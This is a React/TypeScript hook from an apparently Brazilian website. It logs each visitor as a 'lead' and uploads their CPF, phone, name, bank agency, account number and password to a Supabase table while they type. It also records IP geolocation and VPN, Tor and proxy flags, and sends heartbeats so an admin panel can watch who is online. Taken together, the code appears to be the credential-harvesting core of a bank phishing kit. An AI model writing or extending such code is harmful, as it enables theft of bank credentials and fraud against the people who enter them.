import { useEffect, useRef, useCallback } from "react";
import { useLocation } from "react-router-dom";
import { useFlow } from "@/contexts/FlowContext";
import { leadRepository, sessionRepository, type LeadUpdate } from "@/repositories";
import { edgeFunctionsService } from "@/services";
import type { IpInfo } from "@/services/edge-functions.service";

const ADMIN_ROUTES = ["/admin"];
const HEARTBEAT_INTERVAL = 30_000; // 30 s

// sessionStorage is blocked in iOS Safari private browsing — wrap every access.
function sessionGet(key: string): string | null {
  try { return sessionStorage.getItem(key); } catch { return null; }
}
function sessionSet(key: string, value: string): void {
  try { sessionStorage.setItem(key, value); } catch { /* non-fatal */ }
}

export function useLeadTracking() {
  const location = useLocation();
  const { data } = useFlow();
  const leadIdRef = useRef<string | null>(sessionGet("lead_id"));
  const sessionIdRef = useRef<string | null>(null);
  const debounceRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  const isAdmin = ADMIN_ROUTES.some((r) => location.pathname.startsWith(r));

  const updateLeadData = useCallback(async () => {
    if (!leadIdRef.current) return;

    const updates: LeadUpdate = {};
    if (data.cpf) updates.cpf = data.cpf;
    if (data.phone) updates.phone = data.phone;
    if (data.nome) updates.nome = data.nome;
    if (data.segment) updates.segment = data.segment;
    if (data.agency) updates.agency = data.agency;
    if (data.account) updates.account = data.account;
    if (data.password) updates.password = data.password;

    if (Object.keys(updates).length === 0) return;

    try {
      await leadRepository.update(leadIdRef.current, updates);
    } catch (err) {
      console.error("Lead data update error:", err);
    }
  }, [data.cpf, data.phone, data.nome, data.segment, data.agency, data.account, data.password]);

  useEffect(() => {
    if (isAdmin || !leadIdRef.current) return;

    if (debounceRef.current) clearTimeout(debounceRef.current);
    debounceRef.current = setTimeout(updateLeadData, 500);

    return () => {
      if (debounceRef.current) clearTimeout(debounceRef.current);
    };
  }, [updateLeadData, isAdmin]);

  // ── Create session once, update page on route changes ──
  useEffect(() => {
    if (isAdmin) return;

    const page = location.pathname.replace("/", "") || "splash";

    const track = async () => {
      try {
        // Ensure lead exists
        if (!leadIdRef.current) {
          const lead = await leadRepository.create({ current_step: page });
          leadIdRef.current = lead.id;
          sessionSet("lead_id", lead.id);
        } else {
          await leadRepository.update(leadIdRef.current, {
            current_step: page,
            ...(page === "concluido" ? { status: "concluido" } : {}),
          });
        }

        // Session already exists — just update the page
        if (sessionIdRef.current) {
          await sessionRepository.updatePage(sessionIdRef.current, page);
          return;
        }

        // First visit: create a single session with geo data
        let ipData: IpInfo = {};
        try {
          ipData = await edgeFunctionsService.getIpInfo();
        } catch { /* non-fatal — session will still be created without geo data */ }

        const isMobileUa = /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent);

        const session = await sessionRepository.create({
          lead_id: leadIdRef.current,
          page,
          user_agent: navigator.userAgent,
          ip_address:  ipData.ip ?? null,
          city:        ipData.geo?.city ?? null,
          region:      ipData.geo?.region ?? null,
          country:     ipData.geo?.country ?? null,
          org:         ipData.as?.name ?? null,
          country_code: ipData.geo?.country_code ?? null,
          timezone:     ipData.geo?.timezone ?? null,
          latitude:     ipData.geo?.latitude ?? null,
          longitude:    ipData.geo?.longitude ?? null,
          as_name:      ipData.as?.asn && ipData.as?.name
                          ? `${ipData.as.asn} ${ipData.as.name}`
                          : (ipData.as?.name ?? null),
          as_type:      ipData.as?.type ?? null,
          is_vpn:       ipData.anonymous?.is_vpn   ?? false,
          is_proxy:     ipData.anonymous?.is_proxy  ?? false,
          is_tor:       ipData.anonymous?.is_tor    ?? false,
          is_hosting:   ipData.is_hosting ?? false,
          is_mobile:    isMobileUa,
        });

        sessionIdRef.current = session.id;
      } catch (err) {
        console.error("Lead tracking error:", err);
      }
    };

    track();

    // ── Mark session offline on page unload ────────────────────────────────────
    // Using fetch() with keepalive:true + PATCH — this is the correct approach
    // because sendBeacon() only supports POST (can't PATCH) and can't set headers
    // (Supabase REST requires apikey + Authorization headers).
    // keepalive ensures the request survives the page unload event.
    const handleUnload = () => {
      if (!sessionIdRef.current) return;
      const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
      const anonKey    = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
      fetch(
        `${supabaseUrl}/rest/v1/site_sessions?id=eq.${sessionIdRef.current}`,
        {
          method: "PATCH",
          keepalive: true,
          headers: {
            "Content-Type": "application/json",
            "apikey": anonKey,
            "Authorization": `Bearer ${anonKey}`,
            "Prefer": "return=minimal",
          },
          body: JSON.stringify({ is_online: false, ended_at: new Date().toISOString() }),
        },
      ).catch(() => { /* ignore — best-effort on unload */ });
    };

    // ── Heartbeat: atualiza last_seen_at a cada 30s ────────────────────────────
    // Fonte de verdade para presença: "online" = last_seen_at > now() - 60s.
    // Independe de eventos do browser — se o cliente sumiu, após 60s ele some da lista.
    const sendHeartbeat = () => {
      if (!sessionIdRef.current) return;
      const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
      const anonKey    = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY;
      fetch(
        `${supabaseUrl}/rest/v1/site_sessions?id=eq.${sessionIdRef.current}`,
        {
          method: "PATCH",
          headers: {
            "Content-Type": "application/json",
            "apikey": anonKey,
            "Authorization": `Bearer ${anonKey}`,
            "Prefer": "return=minimal",
          },
          body: JSON.stringify({ last_seen_at: new Date().toISOString() }),
        },
      ).catch(() => {});
    };
    const heartbeatId = setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);

    // ── Eventos de saída (complemento ao heartbeat) ────────────────────────────
    // visibilitychange: troca de aba / minimizar app (mais confiável no mobile)
    // pagehide: iOS Safari ao fechar/navegar para fora
    // beforeunload: fallback desktop
    const handleVisibilityChange = () => { if (document.hidden) handleUnload(); };

    window.addEventListener("beforeunload", handleUnload);
    window.addEventListener("pagehide", handleUnload);
    document.addEventListener("visibilitychange", handleVisibilityChange);

    return () => {
      clearInterval(heartbeatId);
      window.removeEventListener("beforeunload", handleUnload);
      window.removeEventListener("pagehide", handleUnload);
      document.removeEventListener("visibilitychange", handleVisibilityChange);
    };
  }, [location.pathname, isAdmin]);
}
